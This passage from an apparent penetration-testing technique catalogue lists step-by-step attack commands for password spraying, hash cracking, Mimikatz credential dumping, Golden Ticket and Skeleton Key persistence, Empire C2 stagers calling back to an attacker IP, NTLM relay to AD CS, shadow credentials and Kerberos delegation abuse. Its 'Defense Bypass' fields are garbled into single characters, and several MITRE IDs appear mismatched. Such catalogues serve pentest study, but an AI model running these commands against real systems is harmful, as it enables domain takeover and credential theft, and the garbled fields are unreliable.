  8. {'step': 8, 'description': 'Start Ligolo proxy and connect agent', 'command': 'sudo ./proxy -selfcert -laddr 0.0.0.0:11601', 'note': 'Then run agent on pivot: ./agent -connect ATTACKER_IP:11601 -ignore-cert'}
- Related Tools: 9 — chisel, ligolo-ng, nxc, proxychains4, rpivot, scp, socat, ssh, sshuttle

#### password-spraying — Password Spraying
- Zone: password-attacks | Category: password-attacks | Difficulty: 2
- OS: linux, windows
- Tags: password-attacks, brute-force, spraying, smb, credentials
- Purpose: Try a few common passwords against many user accounts to avoid account lockout.
- When To Use: When you have a list of valid usernames and want to find weak passwords without triggering lockouts.
- Prerequisites: List of valid usernames, Common password list or guessed password
- Defense Bypass: P, a, s, s, w, o, r, d,  , s, p, r, a, y, i, n, g,  , g, e, n, e, r, a, t, e, s,  , f, e, w, e, r,  , l, o, c, k, o, u, t, s,  , t, h, a, n,  , t, a, r, g, e, t, e, d,  , b, r, u, t, e,  , f, o, r, c, e, .,  , S, t, i, l, l,  , g, e, n, e, r, a, t, e, s,  , l, o, g, i, n,  , e, v, e, n, t, s,  , (, E, v, e, n, t,  , I, D,  , 4, 6, 2, 4, /, 4, 6, 2, 5, ), .
- Remediation: Enforce password complexity, implement MFA, lockout policies
- MITRE ID: T1110.003
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate valid usernames', 'command': 'kerbrute userenum -d DOMAIN --dc DC_IP users.txt', 'note': 'Kerberos user enum avoids account lockout (unlike SMB brute)'}
  2. {'step': 2, 'description': 'Spray common passwords against user list', 'command': 'nxc smb TARGET_RANGE -u users.txt -p "Password123" --continue-on-success', 'note': '--continue-on-success finds ALL valid combos, not just first hit'}
  3. {'step': 3, 'description': 'Analyze spray results', 'command': 'Look for [+] green = valid creds, (Pwn3d!) = local admin confirmed', 'note': 'Throttle sprays against real environments due to lockout policy'}
  4. {'step': 4, 'description': 'Pivot with discovered credentials', 'command': 'nxc smb TARGET -u user -p password --shares', 'note': 'Reuse same credentials across domain-joined hosts (trust relationships)'}
- Related Tools: 15 — cewl, crackmapexec, crunch, enum4linux, feroxbuster, gobuster, hashcat, hydra, impacket, john, kerbrute, lazagne, medusa, mimikatz, name-that-hash

#### hash-cracking — Hash Cracking
- Zone: password-attacks | Category: password-attacks | Difficulty: 3
- OS: linux, windows
- Tags: password-attacks, hashing, cracking, offline
- Purpose: Identify hash types and crack them using wordlists, rules, and brute force.
- When To Use: When you have obtained password hashes from any source.
- Prerequisites: Password hashes (NTLM, Kerberoast, MD5, SHA256, etc.), Wordlists and/or brute force capability
- Defense Bypass: H, a, s, h,  , c, r, a, c, k, i, n, g,  , i, s,  , o, f, f, l, i, n, e, .,  , N, o,  , n, e, t, w, o, r, k,  , t, r, a, f, f, i, c,  , g, e, n, e, r, a, t, e, d, .,  , D, e, t, e, c, t, i, o, n,  , r, e, q, u, i, r, e, s,  , f, i, n, d, i, n, g,  , t, h, e,  , h, a, s, h, e, s,  , o, n,  , d, i, s, k, .
- Remediation: Enforce password complexity, implement MFA, lockout policies
- MITRE ID: T1003.002
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify hash type', 'command': 'hash-identifier HASH_VALUE', 'when': 'When the hash type is unknown', 'output': 'Likely hash type and mode'}
  2. {'step': 2, 'description': 'Crack with Hashcat using wordlist', 'command': 'hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt', 'when': 'When hash type is known', 'output': 'Cracked passwords'}
  3. {'step': 3, 'description': 'Apply rules for better coverage', 'command': 'hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -o cracked.txt', 'when': 'When simple wordlist fails', 'output': 'Additional cracked passwords from rule mutations'}
- Related Tools: 15 — cewl, crunch, hashcat, hydra, john, medusa, mimikatz, name-that-hash, stegcracker, tool:cewl, tool:hash-identifier, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor

#### credential-harvesting — Credential Harvesting
- Zone: post-exploitation | Category: post-exploitation | Difficulty: 3
- OS: windows, linux
- Tags: post-exploitation, credentials, harvesting, memory, browsers
- Purpose: Collect credentials from memory, files, and browsers on compromised systems.
- When To Use: After gaining initial access, to collect credentials for lateral movement.
- Prerequisites: Shell on compromised system, Appropriate privileges for memory access
- Defense Bypass: C, r, e, d, e, n, t, i, a, l,  , h, a, r, v, e, s, t, i, n, g,  , a, c, c, e, s, s, e, s,  , L, S, A, S, S,  , m, e, m, o, r, y, .,  , W, i, n, d, o, w, s,  , D, e, f, e, n, d, e, r,  , m, a, y,  , d, e, t, e, c, t,  , M, i, m, i, k, a, t, z, .,  , E, D, R,  , s, o, l, u, t, i, o, n, s,  , m, o, n, i, t, o, r,  , m, e, m, o, r, y,  , a, c, c, e, s, s, .
- Remediation: Network segmentation, process isolation, credential guard
- MITRE ID: T1056.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Search filesystem for plaintext credentials', 'command': 'grep -ri "password" /etc /var /opt /home 2>/dev/null', 'note': 'Check .bash_history, config files, logs, and application data'}
  2. {'step': 2, 'description': 'Check Windows credential stores', 'command': 'cmdkey /list && dir C:\\ /s *.xml *.ini *.config *.txt 2>nul | findstr "pass"', 'note': 'Windows stores credentials in registry and various config files'}
  3. {'step': 3, 'description': 'Dump Windows credentials with Mimikatz', 'command': 'mimikatz # privilege::debug && mimikatz # sekurlsa::logonpasswords', 'note': 'Requires admin/SeDebugPrivilege on Windows target'}
  4. {'step': 4, 'description': 'Extract GPP cached passwords from SYSVOL', 'command': 'findstr /S /I cpassword \\\\domain\\sysvol\\domain\\policies\\*.xml', 'note': 'GPP cpassword is AES-encrypted with public key; always crackable with gpp-decrypt'}
- Related Tools: 15 — covenant, crackmapexec, empire, gobuster, impacket, lazagne, linpeas, metasploit, mimikatz, nishang, screen, sliver, tool:empire, tool:powershell-empire, tool:volatility

#### persistence — Persistence Mechanisms
- Zone: post-exploitation | Category: post-exploitation | Difficulty: 3
- OS: windows, linux
- Tags: post-exploitation, persistence, backdoor, windows, linux
- Purpose: Establish persistent access to compromised systems across reboots.
- When To Use: After initial access to maintain long-term presence.
- Prerequisites: Shell on compromised system, Appropriate privileges for persistence method
- Defense Bypass: P, e, r, s, i, s, t, e, n, c, e,  , m, e, c, h, a, n, i, s, m, s,  , g, e, n, e, r, a, t, e,  , a, r, t, i, f, a, c, t, s, .,  , U, s, e,  , l, i, v, i, n, g, -, o, f, f, -, t, h, e, -, l, a, n, d,  , t, e, c, h, n, i, q, u, e, s,  , t, o,  , b, l, e, n, d,  , i, n, .
- Remediation: Network segmentation, process isolation, credential guard
- MITRE ID: T1053
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Create Golden Ticket for domain persistence', 'command': 'impacket-ticketer -nthash KRBGT_HASH -domain-sid SID -domain domain.local administrator', 'note': 'Requires krbtgt hash from DCSync; grants indefinite DA access'}
  2. {'step': 2, 'description': 'Create Silver Ticket for service access', 'command': 'mimikatz # kerberos::golden /user:admin /domain:domain /sid:SID /target:server.domain /service:cifs /rc4:SVC_HASH /ptt', 'note': 'Stealthier than Golden Ticket; only works for specific service'}
  3. {'step': 3, 'description': 'Backdoor AdminSDHolder', 'command': 'Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All', 'note': 'Replicates to all protected accounts every 60 minutes'}
  4. {'step': 4, 'description': 'Skeleton Key on DC', 'command': 'mimikatz # privilege::debug && mimikatz # misc::skeleton', 'note': 'Injects master password into LSASS on DC; any user can authenticate with it'}
- Related Tools: 15 — beroot, covenant, crackmapexec, empire, godpotato, impacket, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, metasploit, nishang, powershell, powerup

#### c2-establishment — Command and Control (C2) Establishment
- Zone: post-exploitation | Category: post-exploitation | Difficulty: 4
- OS: windows, linux
- Tags: post-exploitation, c2, command-control, beacon, management
- Purpose: Set up command and control channels for managing compromised systems.
- When To Use: After initial access when managing multiple compromised systems.
- Prerequisites: Compromised system with outbound internet access, C2 framework or custom payload
- Defense Bypass: C, 2,  , t, r, a, f, f, i, c,  , c, a, n,  , b, e,  , h, i, d, d, e, n,  , i, n,  , H, T, T, P, S, ,,  , D, N, S, ,,  , o, r,  , o, t, h, e, r,  , l, e, g, i, t, i, m, a, t, e,  , p, r, o, t, o, c, o, l, s, .,  , D, o, m, a, i, n,  , f, r, o, n, t, i, n, g,  , a, n, d,  , f, a, s, t, -, f, l, u, x,  , D, N, S,  , h, e, l, p,  , a, v, o, i, d,  , d, e, t, e, c, t, i, o, n, .
- Remediation: Network segmentation, process isolation, credential guard
- MITRE ID: T1071.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Set up C2 framework', 'command': 'For Empire: ./ps/empire && listeners && uselistener http', 'note': 'Choose C2 based on engagement requirements: Empire, Covenant, Sliver, or custom'}
  2. {'step': 2, 'description': 'Generate implant/stager', 'command': 'usestager windows/launcher_bat LHOST=ATTACKER_IP LPORT=8080', 'note': 'Launcher types: bat, hta, dns, windows/launcher_bin for raw shellcode'}
  3. {'step': 3, 'description': 'Execute implant on target', 'command': 'powershell -ep bypass -EncodedCommand [BASE64_PAYLOAD]', 'note': 'Base64-encoded PowerShell is common for initial C2 callbacks'}
  4. {'step': 4, 'description': 'Verify callback and interact', 'command': 'agents && interact AGENT_ID', 'note': 'Once agent checks in, use C2 to escalate, pivot, and exfiltrate'}
- Related Tools: 12 — covenant, crackmapexec, empire, lazagne, metasploit, nishang, screen, sliver, tool:cloudflared, tool:empire, tool:powershell-empire, tool:sliver

#### arp-discovery — ARP Network Discovery
- Zone: network-enum | Category: network-enum | Difficulty: 1
- OS: linux
- Tags: network-enum, arp, discovery, lan, live-hosts
- Purpose: Use ARP requests to discover live hosts on a local network segment.
- When To Use: When ICMP is filtered and you need to identify live hosts on a LAN.
- Prerequisites: Access to the local network segment, Network interface in promiscuous mode if needed
- Defense Bypass: A, R, P,  , s, c, a, n, n, i, n, g,  , i, s,  , g, e, n, e, r, a, l, l, y,  , n, o, t,  , l, o, g, g, e, d, .,  , S, o, m, e,  , N, I, D, S,  , m, a, y,  , d, e, t, e, c, t,  , u, n, u, s, u, a, l,  , A, R, P,  , t, r, a, f, f, i, c, .
- Remediation: Disable unused services, enforce firewall rules, SNMP v3
- MITRE ID: T1046
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Discover hosts via ARP on local network', 'command': 'arp-scan --localnet --interface=eth0', 'note': 'ARP discovery works even when ICMP is blocked'}
  2. {'step': 2, 'description': 'Passive ARP discovery', 'command': 'netdiscover -r 192.168.X.0/24 -i eth0 -P', 'note': 'Passive mode listens for ARP traffic without sending packets'}
  3. {'step': 3, 'description': 'Map discovered IPs to MAC addresses', 'command': 'arp -a', 'note': 'OUI lookup can identify device vendors'}
  4. {'step': 4, 'description': 'Identify network segment boundaries', 'command': 'ip route && ifconfig', 'note': 'Understand routing to plan pivoting strategy'}
- Related Tools: 15 — arp-scan, hydra, ip, ls, netdiscover, nmap, onesixtyone, showmount, smbclient, smbmap, snmpwalk, tool:chisel, tool:cloudflared, tool:dnscan, tool:httprobe

#### snmp-enumeration — SNMP Enumeration
- Zone: network-enum | Category: network-enum | Difficulty: 2
- OS: linux
- Tags: network-enum, snmp, enumeration, community-string
- Purpose: Enumerate network devices, systems, and configurations via SNMP.
- When To Use: When SNMP (UDP 161) is accessible on the target network.
- Prerequisites: SNMP service accessible, Community string (public/private) or brute force capability
- Defense Bypass: S, N, M, P,  , v, 1, /, v, 2, c,  , t, r, a, n, s, m, i, t, s,  , c, o, m, m, u, n, i, t, y,  , s, t, r, i, n, g, s,  , i, n,  , c, l, e, a, r, t, e, x, t, .,  , S, N, M, P,  , v, 3,  , p, r, o, v, i, d, e, s,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , a, n, d,  , e, n, c, r, y, p, t, i, o, n, .
- Remediation: Disable unused services, enforce firewall rules, SNMP v3
- MITRE ID: T1046
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Discover SNMP service', 'command': 'nmap -sU -p 161 TARGET_IP', 'note': 'UDP 161 = SNMP; also try 162 for traps'}
  2. {'step': 2, 'description': 'Brute force community strings', 'command': 'onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP', 'note': 'Common strings: public, private, community, readonly, readwrite'}
  3. {'step': 3, 'description': 'Enumerate SNMP tree', 'command': 'snmpwalk -v2c -c COMMUNITY TARGET_IP .1.3.6.1.2.1', 'note': 'MIB OID .1.3.6.1.2.1 = standard system info; .1.3.6.1.4.1 = vendor-specific'}
  4. {'step': 4, 'description': 'Extract interesting data', 'command': 'snmpwalk -v2c -c COMMUNITY TARGET_IP .1.3.6.1.2.1.1 (system info)', 'note': 'Look for sysDescr, sysName, interfaces, routing tables, processes'}
- Related Tools: 15 — adidnsdump, arp-scan, beroot, bloodhound, crackmapexec, enum4linux, hydra, ip, kerbrute, ldapnomnom, ldapsearch, ldeep, linenum, linpeas, ls

#### reporting-screenshots — Screenshot Documentation
- Zone: reporting | Category: reporting | Difficulty: 1
- OS: any
- Tags: reporting, screenshots, documentation, evidence
- Purpose: Capture and annotate screenshots for penetration testing documentation and reporting.
- When To Use: Throughout the engagement to document findings for the final report.
- Prerequisites: Access to target systems or web interfaces, Screenshot tool installed
- Defense Bypass: S, c, r, e, e, n, s, h, o, t, s,  , a, r, e,  , p, a, s, s, i, v, e,  , a, n, d,  , d, o,  , n, o, t,  , g, e, n, e, r, a, t, e,  , l, o, g, s,  , o, n,  , t, a, r, g, e, t,  , s, y, s, t, e, m, s, .
- Remediation: Minimize sensitive data exposure in reports
- MITRE ID: N/A
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Document initial reconnaissance', 'command': 'flameshot gui -p ./screenshots/', 'note': 'Take screenshots of nmap output, discovered hosts, and initial findings'}
  2. {'step': 2, 'description': 'Document each exploitation phase', 'command': 'Take screenshot after successful exploit, shell, and privilege escalation', 'note': 'CPENT examiners grade based on documented evidence of each phase'}
  3. {'step': 3, 'description': 'Capture flags and proof', 'command': 'type C:\\flag.txt or cat /flag/root.txt and screenshot the output', 'note': 'Screenshots must clearly show hostname, IP, and flag content'}
  4. {'step': 4, 'description': 'Organize screenshots by host and phase', 'command': 'mkdir -p ./report/screenshots/HOSTNAME/phase1_recon phase2_exploit phase3_privesc', 'note': 'Structured folders make report writing faster'}
- Related Tools: 7 — aquatone, burp-suite, cherrytree, eyewitness, flameshot, mosquitto-clients, plumhound

#### metasploit-exploitation — Metasploit Framework Exploitation
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Difficulty: 3
- OS: linux, windows
- Tags: exploitation, framework, exploits, modules, automation
- Purpose: Use Metasploit Framework to search for and launch exploits against target systems.
- When To Use: When you have identified a vulnerable service and want to use a reliable, maintained exploit.
- Prerequisites: Target and service identified, Appropriate exploit module available, LHOST configured
- Defense Bypass: M, e, t, a, s, p, l, o, i, t,  , e, x, p, l, o, i, t, s,  , a, r, e,  , w, e, l, l, -, k, n, o, w, n,  , a, n, d,  , s, i, g, n, a, t, u, r, e, s,  , e, x, i, s, t, .,  , U, s, e,  , c, u, s, t, o, m,  , e, n, c, o, d, e, r, s,  , o, r,  , m, a, n, u, a, l,  , e, x, p, l, o, i, t, a, t, i, o, n,  , f, o, r,  , s, t, e, a, l, t, h, .
- Remediation: Restrict framework dependencies, code signing
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Search for relevant exploit module', 'command': 'msfconsole -q "search CVE-XXXX-XXXX or exploit name"', 'note': 'msfconsole -q starts without banner for faster operation'}
  2. {'step': 2, 'description': 'Configure and run exploit', 'command': 'use exploit/windows/smb/ms17_010_eternalblue && set RHOSTS TARGET && set LHOST ATTACKER && run', 'note': 'Always set payload, LHOST, RHOSTS, and LPORT before running'}
  3. {'step': 3, 'description': 'Post-exploitation enumeration', 'command': 'use post/multi/recon/local_exploit_suggester && set SESSION ID && run', 'note': 'Local exploit suggester recommends privesc modules based on patch level'}
  4. {'step': 4, 'description': 'Migrate to stable process', 'command': 'meterpreter > ps && meterpreter > migrate PID', 'note': 'Migration prevents session loss if initial exploit process dies'}
- Related Tools: 15 — angr, commix, gdb, ivre, lfisuite, liffy, metasploit, msfconsole, msfvenom, nuclei, one_gadget, powershell, pwninit, pwntools, ropper

#### adcs-esc1 — AD CS ESC1 — Enroll as Any User
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, adcs, esc1, certificates, authentication-bypass
- Purpose: Obtain certificates for arbitrary users to authenticate as them or escalate privileges
- When To Use: When AD CS is present and vulnerable certificate templates allow ENROLLEE_SUPPLIES_SUBJECT
- Prerequisites: AD CS CA server, Vulnerable certificate template with ENROLLEE_SUPPLIES_SUBJECT, Valid domain credentials
- Defense Bypass: C, e, r, t, i, f, i, c, a, t, e, -, b, a, s, e, d,  , a, u, t, h,  , b, y, p, a, s, s, e, s,  , n, o, r, m, a, l,  , p, a, s, s, w, o, r, d,  , c, h, e, c, k, s, ;,  , r, e, q, u, i, r, e, s,  , A, D,  , C, S,  , m, o, n, i, t, o, r, i, n, g
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1552.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate AD CS templates with Certify', 'command': 'Certify.exe find /vulnerable', 'note': 'Look for ESC1 flag and ENROLLEE_SUPPLIES_SUBJECT'}
  2. {'step': 2, 'description': 'Request certificate with target SAN', 'command': 'Certipy req -u user@domain -p Pass -ca CA_NAME -template TEMPLATE -alt Administrator', 'note': 'Requests cert with Administrator as SAN'}
  3. {'step': 3, 'description': 'Authenticate with certificate', 'command': 'certipy auth -pfx administrator.pfx -domain domain.local', 'note': 'Yields NTLM hash for Administrator'}
  4. {'step': 4, 'description': 'Use hash for lateral movement or DCSync', 'command': 'impacket-secretsdump -hashes :NTLM_HASH domain/Administrator@DC', 'note': 'Certificate-derived hash works like any other NTLM hash'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### adcs-esc4 — AD CS ESC4 — Vulnerable Template ACL
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, adcs, esc4, certificates, acl-abuse
- Purpose: Modify certificate template permissions to enable ESC1-style enrollment
- When To Use: When you have Write/GenericWrite permissions on a certificate template object
- Prerequisites: AD CS CA server, Write permissions on certificate template, Valid domain credentials
- Defense Bypass: M, o, d, i, f, y, i, n, g,  , t, e, m, p, l, a, t, e,  , A, C, L, s,  , m, a, y,  , t, r, i, g, g, e, r,  , C, A,  , l, o, g, s, ;,  , E, S, C, 4,  , i, s,  , l, e, s, s,  , c, o, m, m, o, n,  , t, h, a, n,  , E, S, C, 1
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1552.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify writable certificate templates', 'command': 'Certify.exe find /vulnerable', 'note': 'Look for templates with Write/GenericWrite ACLs'}
  2. {'step': 2, 'description': 'Modify template to add ENROLLEE_SUPPLIES_SUBJECT', 'command': "certipy template -u user@domain -p Pass -template TEMPLATE -add 'ENROLLEE_SUPPLIES_SUBJECT'", 'note': 'Modifies template to allow SAN specification'}
  3. {'step': 3, 'description': 'Request certificate as ESC1', 'command': 'certipy req -u user@domain -p Pass -ca CA_NAME -template TEMPLATE -alt Administrator', 'note': 'Now exploitable as ESC1'}
  4. {'step': 4, 'description': 'Authenticate with obtained certificate', 'command': 'certipy auth -pfx administrator.pfx -domain domain.local', 'note': 'Gets NTLM hash for impersonated user'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### adcs-esc8 — AD CS ESC8 — NTLM Relay to AD CS
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, adcs, esc8, ntlm-relay, petitpotam
- Purpose: Obtain certificates for arbitrary users via NTLM relay to AD CS
- When To Use: When AD CS Web Enrollment is exposed and NTLM auth can be coerced/relayed
- Prerequisites: AD CS Web Enrollment (certsrv) accessible, NTLM auth relay capability, Coercion method or waiting for auth
- Defense Bypass: R, e, l, a, y, i, n, g,  , N, T, L, M,  , g, e, n, e, r, a, t, e, s,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , l, o, g, s, ;,  , E, S, C, 8,  , r, e, q, u, i, r, e, s,  , b, o, t, h,  , r, e, l, a, y,  , c, a, p, a, b, i, l, i, t, y,  , a, n, d,  , W, e, b,  , E, n, r, o, l, l, m, e, n, t,  , e, x, p, o, s, u, r, e
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1187
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify AD CS Web Enrollment', 'command': 'nmap -p 443,80 DC_IP --script http-title', 'note': "Look for 'Certificate Services' or 'certsrv'"}
  2. {'step': 2, 'description': 'Start NTLM relay to AD CS', 'command': 'ntlmrelayx.py -t http://DC_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController', 'note': 'Relays captured NTLM auth to AD CS enrollment endpoint'}
  3. {'step': 3, 'description': 'Coerce DC to authenticate', 'command': 'python3 PetitPotam.py -d DOMAIN -u User -p Pass ATTACKER_IP DC_IP', 'note': 'Forces DC to send NTLM challenge to relay'}
  4. {'step': 4, 'description': 'Use obtained certificate', 'command': 'certipy auth -pfx DC.pfx -domain domain.local', 'note': 'Certificate for DC account grants DC-level access'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### shadow-credentials — Shadow Credentials (msDS-KeyCredentialLink)
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, shadow-credentials, kerberos, persistence
- Purpose: Obtain Kerberos TGT for any user by manipulating msDS-KeyCredentialLink
- When To Use: When you have Write/GenericWrite permissions on the target user object
- Prerequisites: Write permissions on target user object, Domain Controller with Key Distribution Center
- Defense Bypass: S, h, a, d, o, w,  , c, r, e, d, e, n, t, i, a, l, s,  , a, r, e,  , n, o, t,  , c, o, m, m, o, n, l, y,  , m, o, n, i, t, o, r, e, d, ;,  , g, e, n, e, r, a, t, e, s,  , P, A, C,  , b, u, t,  , n, o,  , p, a, s, s, w, o, r, d,  , c, h, a, n, g, e
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1098.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Generate key pair and certificate', 'command': 'openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes', 'note': 'Generate attacker-controlled key pair'}
  2. {'step': 2, 'description': 'Add shadow credential to target', 'command': 'Whisker.exe add /target:DOMAIN\\TargetUser', 'note': "Adds msDS-KeyCredentialLink with attacker's public key"}
  3. {'step': 3, 'description': 'Request TGT with added credential', 'command': 'gettgt.py -aesKey KEY_HEX domain/TargetUser@DOMAIN -keytab keytab', 'note': 'Uses the added key credential to request TGT'}
  4. {'step': 4, 'description': 'Authenticate with obtained TGT', 'command': 'export KRB5CCNAME=TargetUser.ccache && impacket-psexec -k -no-pass domain/TargetUser@TARGET', 'note': 'Authenticate as target user without password'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### rbcd-attack — Resource-Based Constrained Delegation (RBCD)
- Zone: active-directory | Category: active-directory | Difficulty: 4
- OS: windows
- Tags: ad, rbcd, delegation, resource-based, s4u
- Purpose: Abuse RBCD to impersonate privileged users and compromise target computers
- When To Use: When you have GenericWrite or GenericAll permissions on a computer object
- Prerequisites: GenericWrite/GenericAll on computer object, Domain functional level 2012+, Valid domain credentials
- Defense Bypass: R, B, C, D,  , i, s,  , a,  , l, e, g, i, t, i, m, a, t, e,  , A, D,  , f, e, a, t, u, r, e, ;,  , g, e, n, e, r, a, t, i, n, g,  , m, a, c, h, i, n, e,  , a, c, c, o, u, n, t, s,  , a, n, d,  , d, e, l, e, g, a, t, i, o, n,  , c, o, n, f, i, g, s,  , m, a, y,  , t, r, i, g, g, e, r,  , a, l, e, r, t, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1134.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Create attacker-controlled machine account', 'command': "Powermad.ps1: New-MachineAccount -MachineName EvilPC$ -Password (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)", 'note': 'Or use existing controlled machine account'}
  2. {'step': 2, 'description': 'Configure RBCD on target computer', 'command': "impacket-rbcd -delegate-from 'EvilPC$' -delegate-to 'TARGETPC$' -action write domain/user:pass", 'note': 'Writes msDS-AllowedToActOnBehalfOfOtherIdentity'}
  3. {'step': 3, 'description': 'Request service ticket impersonating privileged user', 'command': "impacket-getST -spn cifs/target.domain -impersonate administrator 'domain/EvilPC$:Pass'", 'note': 'S4U2Self and S4U2Proxy to get service ticket'}
  4. {'step': 4, 'description': 'Use ticket to access target', 'command': 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass domain/administrator@target', 'note': 'Authenticate to target as Administrator via RBCD'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### unconstrained-delegation — Unconstrained Delegation Abuse
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, unconstrained-delegation, kerberos, tgt, printerbug
- Purpose: Capture privileged TGTs by compromising hosts with unconstrained delegation
- When To Use: When you have SYSTEM access on a host with TRUSTED_FOR_DELEGATION flag
- Prerequisites: SYSTEM access on computer with unconstrained delegation, PrinterBug/PetitPotam for forced authentication
- Defense Bypass: M, o, n, i, t, o, r, i, n, g,  , f, o, r,  , u, n, c, o, n, s, t, r, a, i, n, e, d,  , d, e, l, e, g, a, t, i, o, n,  , a, n, d,  , u, n, u, s, u, a, l,  , K, e, r, b, e, r, o, s,  , t, i, c, k, e, t,  , p, a, t, t, e, r, n, s,  , d, e, t, e, c, t, s,  , t, h, i, s,  , a, t, t, a, c, k
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.001
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Identify unconstrained delegation hosts', 'command': 'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation', 'note': 'Or: ldapsearch for userAccountControl flag 524288 (TRUSTED_FOR_DELEGATION)'}
  2. {'step': 2, 'description': 'Compromise the delegation host', 'command': 'impacket-psexec domain/user:pass@unconstrained-host', 'note': 'Obtain SYSTEM shell on the host'}
  3. {'step': 3, 'description': 'Monitor for incoming TGTs', 'command': 'mimikatz # sekurlsa::tickets /export', 'note': 'Rubeus also monitors: Rubeus.exe monitor /interval:5'}
  4. {'step': 4, 'description': 'Coerce DC to authenticate', 'command': 'python3 PrinterBug.py domain/user:pass@DC_IP ATTACKER_IP', 'note': 'Forces DC to send its TGT to the compromised host'}
  5. {'step': 5, 'description': 'Extract DC TGT and use for DCSync', 'command': 'mimikatz # kerberos::ptt Administrator.ccache && impacket-secretsdump -just-dc domain/Administrator@DC', 'note': 'DC TGT grants full domain compromise'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gdb, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx

#### constrained-delegation-s4u — Constrained Delegation S4U2Self/S4U2Proxy
- Zone: active-directory | Category: active-directory | Difficulty: 4
- OS: windows
- Tags: ad, constrained-delegation, s4u, kerberos, impersonation
- Purpose: Impersonate any user to access specific services allowed by constrained delegation
- When To Use: When you have credentials for an account with msDS-AllowedToDelegateTo configured
- Prerequisites: Account with constrained delegation configured, Service SPN target
- Defense Bypass: C, o, n, s, t, r, a, i, n, e, d,  , d, e, l, e, g, a, t, i, o, n,  , i, s,  , a,  , l, e, g, i, t, i, m, a, t, e,  , f, e, a, t, u, r, e, ;,  , S, 4, U,  , a, b, u, s, e,  , m, a, y,  , t, r, i, g, g, e, r,  , K, e, r, b, e, r, o, s,  , l, o, g, g, i, n, g,  , a, l, e, r, t, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify accounts with constrained delegation', 'command': "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo", 'note': 'Or ldapsearch for msDS-AllowedToDelegateTo attribute'}
  2. {'step': 2, 'description': 'Obtain credentials for service account', 'command': 'nxc smb TARGET -u user -p Pass', 'note': 'Password spray or found credentials for the service account'}
  3. {'step': 3, 'description': 'Request service ticket via S4U2Self', 'command': 'impacket-getST -spn cifs/target.domain -impersonate administrator domain/svc_account:Pass', 'note': 'S4U2Self gets a forwardable TGT, S4U2Proxy gets service ticket'}
  4. {'step': 4, 'description': 'Use obtained ticket', 'command': 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass domain/administrator@target', 'note': 'Access target service as impersonated user'}
